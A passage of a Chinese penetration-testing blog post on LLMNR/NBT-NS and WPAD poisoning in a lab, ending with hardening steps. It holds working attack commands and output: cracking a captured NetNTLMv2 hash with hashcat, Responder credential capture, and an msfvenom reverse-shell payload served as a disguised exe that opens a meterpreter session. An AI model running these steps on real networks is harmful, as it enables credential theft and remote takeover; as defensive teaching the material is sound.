+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sc92n::WIN-JH8N3KV3OQ0:75ca7c174829730d:7C8437661030E0EB8D762DCFC77CBE65:0101000000000000000C19E89C21D801B8B5060ABB05AFE600000000020008004400350033004A0001001E00570049004E002D004E004B0048004A00480050005600460045005000490004003400570049004E002D004E004B0048004A0048005000560046004500500049002E004400350033004A002E004C004F00430041004C00030014004400350033004A002E004C004F00430041004C00050014004400350033004A002E004C004F00430041004C0007000800000C19E89C21D80106000400020000000800300030000000000000000100000000200000C1802F43EEA3DDC3521CCF236AAF808F1A6C31366979710880AC8CED8547228D0A001000000000000000000000000000000000000900140063006900660073002F0078007800780061006100000000000000000000000000
+</span></span></code></pre></div><p>之后我们使用hashcat进行破解：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ hashcat -m <span class="m">5600</span> hash.txt passwd.txt                                                                                                                                                                                                                                                 
+</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SC92N::WIN-JH8N3KV3OQ0:75ca7c174829730d:7c8437661030e0eb8d762dcfc77cbe65:0101000000000000000c19e89c21d801b8b5060abb05afe600000000020008004400350033004a0001001e00570049004e002d004e004b0048004a00480050005600460045005000490004003400570049004e002d004e004b0048004a0048005000560046004500500049002e004400350033004a002e004c004f00430041004c00030014004400350033004a002e004c004f00430041004c00050014004400350033004a002e004c004f00430041004c0007000800000c19e89c21d80106000400020000000800300030000000000000000100000000200000c1802f43eea3ddc3521ccf236aaf808f1a6c31366979710880ac8ced8547228d0a001000000000000000000000000000000000000900140063006900660073002f0078007800780061006100000000000000000000000000:p@ssw0rd
+</span></span><span class="line"><span class="cl">                                                 
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Cracked
+</span></span><span class="line"><span class="cl">Hash.Name........: NetNTLMv2
+</span></span><span class="line"><span class="cl">Hash.Target......: SC92N::WIN-JH8N3KV3OQ0:75ca7c174829730d:7c843766103...000000
+</span></span><span class="line"><span class="cl">Time.Started.....: Mon Feb <span class="m">14</span> 12:25:27 <span class="m">2022</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time.Estimated...: Mon Feb <span class="m">14</span> 12:25:27 <span class="m">2022</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>passwd.txt<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Speed.#1.........:     <span class="m">1922</span> H/s <span class="o">(</span>0.01ms<span class="o">)</span> @ Accel:1024 Loops:1 Thr:1 Vec:16
+</span></span><span class="line"><span class="cl">Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests
+</span></span><span class="line"><span class="cl">Progress.........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Rejected.........: 0/1 <span class="o">(</span>0.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Point....: 0/1 <span class="o">(</span>0.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span class="line"><span class="cl">Candidates.#1....: p@ssw0rd -&gt; p@ssw0rd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Started: Mon Feb <span class="m">14</span> 12:25:26 <span class="m">2022</span>
+</span></span><span class="line"><span class="cl">Stopped: Mon Feb <span class="m">14</span> 12:25:29 <span class="m">2022</span>
+</span></span></code></pre></div><p>虽然这个方式很隐蔽，但是如果遇到密码比较强的就很难受。</p>
+<h2 id="捕获http明文">捕获HTTP明文</h2>
+<p>我们可以使用responder工具是去获取HTTP的<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization">Authorization</a>信息，主要的方法就是开启HTTP认证的功能-b即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo responder -I eth0 -fvb 
+</span></span></code></pre></div><p>我们去输入未验证过的网址就会弹出验证窗口，让我们输入凭证：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/6.png" alt="6"></p>
+<p>输入后就可以在kali中看到我们输入的明文信息：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/7.png" alt="7"></p>
+<p>我们查看流量中是获取到了http认证的信息，解密base64即可：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/8.png" alt="8"></p>
+<p>这个功能还是不错的，就是动作比较明显。</p>
+<blockquote>
+<p>如果未能获取到明文凭证可以尝试重启下受害者的机器</p>
+</blockquote>
+<h2 id="利用wpad攻击获取系统权限">利用WPAD攻击获取系统权限</h2>
+<p>用户在访问网页时，首先会查询PAC文件的位置，具体方式如下：</p>
+<p><strong>1、通过DHCP服务器</strong></p>
+<p>如图</p>
+<p><img src="https://wooyun.js.org/images_result/images/201512071422587546237.png" alt="这里写图片描述"></p>
+<p>web浏览器向DHCP服务器发送DHCP INFORM查询PAC文件位置</p>
+<p>DHCP服务器返回DHCP ACK数据包，包含PAC文件位置</p>
+<p><strong>2、通过DNS查询</strong></p>
+<p>web浏览器向DNS服务器发起 WPAD＋X 的查询</p>
+<p>DNS服务器返回提供WPAD主机的IP地址</p>
+<p>web浏览器通过该IP的80端口下载wpad.dat</p>
+<p><strong>3、通过NBNS查询</strong></p>
+<blockquote>
+<p>Tips：</p>
+<p>Windows 2K , XP , 2K3 只支持 DNS 和 NetBIOS</p>
+<p>Windows Vista 之后（包括 2K8 ， Win7，Win8.x，Win 10）支持DNS、NBNS、LLMNR</p>
+</blockquote>
+<p>如果DHCP和DNS服务器均没有响应，同时当前缓存没有所请求的主机名，就会发起如下名称解析：</p>
+<p>如果当前系统支持LLMNR（Link-Local Multicast Name Resolution），先发起广播LLMNR查询，如果没有响应再发起广播NBNS查询</p>
+<p>如果有主机回应PAC文件位置</p>
+<p>web浏览器通过该IP的80端口下载wpad.dat</p>
+<blockquote>
+<p>这里的内容来自于<a href="https://wooyun.js.org/drops/%E5%9F%BA%E4%BA%8EWPAD%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.html">
+基于WPAD的中间人攻击</a></p>
+</blockquote>
+<p>WPAD功能在上面做了介绍，主要是攻击原理如下图,</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/9.jpeg" alt="9"></p>
+<p>我们先去msf生成一个exe文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo msfvenom -p windows/x64/meterpreter/reverse_https <span class="nv">LHOST</span><span class="o">=</span>172.16.0.107 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o /usr/share/responder/files/filetoserve.exe 
+</span></span></code></pre></div><p>然后去编辑responder的配置文件，文件位置在<code>/usr/share/responder/Responder.conf</code>,修改下面的配置为On：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[HTTP Server]
+</span></span><span class="line"><span class="cl">; Set to On to always serve the custom EXE
+</span></span><span class="line"><span class="cl">Serve-Always = On
+</span></span><span class="line"><span class="cl">; Set to On to replace any requested .exe with the custom EXE
+</span></span><span class="line"><span class="cl">Serve-Exe = On 
+</span></span><span class="line"><span class="cl">; Set to On to serve the custom HTML if the URL does not contain .exe
+</span></span><span class="line"><span class="cl">; Set to Off to inject the &#39;HTMLToInject&#39; in web pages instead
+</span></span><span class="line"><span class="cl">Serve-Html = On 
+</span></span></code></pre></div><p>在kali执行：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo responder -I eth0 -wrfv
+</span></span></code></pre></div><p>在msf中执行监听：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; use exploit/multi/handler
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/x64/meterpreter/reverse_https
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span>&gt; windows/x64/meterpreter/reverse_https
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; show options
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name  Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----  ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>windows/x64/meterpreter/reverse_https<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   EXITFUNC  process          yes       Exit technique <span class="o">(</span>Accepted: <span class="s1">&#39;&#39;</span>, seh, thread, process, none<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   LHOST     172.16.0.107     yes       The <span class="nb">local</span> listener hostname
+</span></span><span class="line"><span class="cl">   LPORT     <span class="m">53</span>               yes       The <span class="nb">local</span> listener port
+</span></span><span class="line"><span class="cl">   LURI                       no        The HTTP Path
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exploit target:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Wildcard Target
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">4444</span>
+</span></span><span class="line"><span class="cl"><span class="nv">lport</span> <span class="o">=</span>&gt; <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
+</span></span></code></pre></div><p>在受害机的网页中输入地址会弹出下载文件(可以修改一些比较诱惑性的，比如flash.exe等)：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/10.png" alt="10"></p>
+<p>看到记录已经在发送文件的数据了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/11.png" alt="11"></p>
+<p>当受害者执行exe后会反弹回msf的shell：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started HTTPS reverse handler on https://172.16.0.107:4444
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.105<span class="p">;</span> <span class="o">(</span>UUID: fvlb5805<span class="o">)</span> Without a database connected that payload UUID tracking will not work!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.105<span class="p">;</span> <span class="o">(</span>UUID: fvlb5805<span class="o">)</span> Staging x64 payload <span class="o">(</span><span class="m">201308</span> bytes<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> https://172.16.0.107:4444 handling request from 172.16.0.105<span class="p">;</span> <span class="o">(</span>UUID: fvlb5805<span class="o">)</span> Without a database connected that payload UUID tracking will not work!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">52</span> opened <span class="o">(</span>172.16.0.107:4444 -&gt; 127.0.0.1 <span class="o">)</span> at 2022-02-14 10:42:49 +0800
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; sysinfo
+</span></span><span class="line"><span class="cl">Computer        : WIN-JH8N3KV3OQ0
+</span></span><span class="line"><span class="cl">OS              : Windows <span class="m">7</span> <span class="o">(</span>6.1 Build 7601, Service Pack 1<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Architecture    : x64
+</span></span><span class="line"><span class="cl">System Language : en_US
+</span></span><span class="line"><span class="cl">Domain          : HACK
+</span></span><span class="line"><span class="cl">Logged On Users : <span class="m">3</span>
+</span></span><span class="line"><span class="cl">Meterpreter     : x64/windows
+</span></span><span class="line"><span class="cl">meterpreter &gt;  
+</span></span></code></pre></div><h1 id="0x04-防御">0x04 防御</h1>
+<p>主要还是关掉<strong>LLMNR</strong>和<strong>NBT-NS</strong>，如果只关闭其中一个也会被攻击成功，所以都要关掉才行，</p>
+<h2 id="关闭llmnr">关闭LLMNR</h2>
+<ol>
+<li>
+<p>win+R输入gpedit.msc</p>
+</li>
+<li>
+<p>找到路径Local Computer Policy -&gt; Computer Configuration -&gt; Administrative Templates -&gt; Network -&gt; DNS Client</p>
+</li>
+<li>
+<p>找到<strong>Turn Off Multicast Name Resolution</strong>，点击enable即可</p>
+</li>
+</ol>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/12.png" alt="12"></p>
+<h2 id="关闭netbios">关闭NetBIOS</h2>
+<ol>
+<li>打开网络共享中心</li>
+<li>点击更改适配器设置</li>
+<li>选择指定的网卡，右键属性</li>
+<li>选择Internet 协议版本 4 (TCP/IPv4)</li>
+<li>点击高级</li>
+<li>选择WINS选项，点击禁用TCP/IP上的NetBIOS</li>
+</ol>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/13.png" alt="13"></p>
+<h2 id="修复结果">修复结果</h2>
+<p>关闭两者后再尝试回出现错误：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/14.png" alt="14"></p>
+<h1 id="0x05-参考">0x05 参考</h1>
+<p><a href="https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/">https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/</a></p>
+<p><a href="https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/">https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/</a></p>
+<p><a href="https://apt404.github.io/2016/07/24/llmnr-wpad/">https://apt404.github.io/2016/07/24/llmnr-wpad/</a></p>
+<p><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/llmnr_nbt-ns.html">https://xxe.icu/llmnr_nbt-ns.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/ssh_tunnel.html" class="underline text-yellow-600">SSH隧道技术研究和实战</a></li>
+    
+    <li><a href="/windows_set_ip_access.html" class="underline text-yellow-600">Windows设置指定IP远程访问3389</a></li>
+    
+    <li><a href="/powershell-attack.html" class="underline text-yellow-600">Powershell在渗透测试中的利用</a></li>
+    
+    <li><a href="/apparmor_bypass.html" class="underline text-yellow-600">Apparmor的绕过</a></li>
+    
+    <li><a href="/linux_capabilities_2.html" class="underline text-yellow-600">Linux Capabilities 入门教程：进阶实战篇</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-基本概念">0x00 基本概念</a>
+      <ul>
+        <li><a href="#llmnr">LLMNR</a>
+          <ul>
+            <li><a href="#包头结构">包头结构</a></li>
+          </ul>
+        </li>
+        <li><a href="#netbios">NetBIOS</a>
+          <ul>
+            <li><a href="#服务">服务</a></li>
+            <li><a href="#名称服务">名称服务</a></li>
+            <li><a href="#节点类型">节点类型</a></li>
+          </ul>
+        </li>
+        <li><a href="#wpad">WPAD</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x01-工作原理">0x01 工作原理</a></li>
+    <li><a href="#0x02-攻击工具">0x02 攻击工具</a>
+      <ul>
+        <li><a href="#nbnspoof---netbios-name-service-spoofer">NBNSpoof - NetBIOS Name Service Spoofer</a></li>
+        <li><a href="#llmnr_response">llmnr_response</a></li>
+        <li><a href="#responder">Responder</a></li>
+        <li><a href="#inveigh">Inveigh</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-攻击实战">0x03 攻击实战</a>
+      <ul>
+        <li><a href="#捕获net-ntlmv2">捕获Net-NTLMv2</a>
+          <ul>
+            <li><a href="#主要的工作流程">主要的工作流程</a></li>
+            <li><a href="#实战">实战</a></li>
+          </ul>
+        </li>
+        <li><a href="#捕获http明文">捕获HTTP明文</a></li>
+        <li><a href="#利用wpad攻击获取系统权限">利用WPAD攻击获取系统权限</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x04-防御">0x04 防御</a>
+      <ul>
+        <li><a href="#关闭llmnr">关闭LLMNR</a></li>
+        <li><a href="#关闭netbios">关闭NetBIOS</a></li>
+        <li><a href="#修复结果">修复结果</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x05-参考">0x05 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
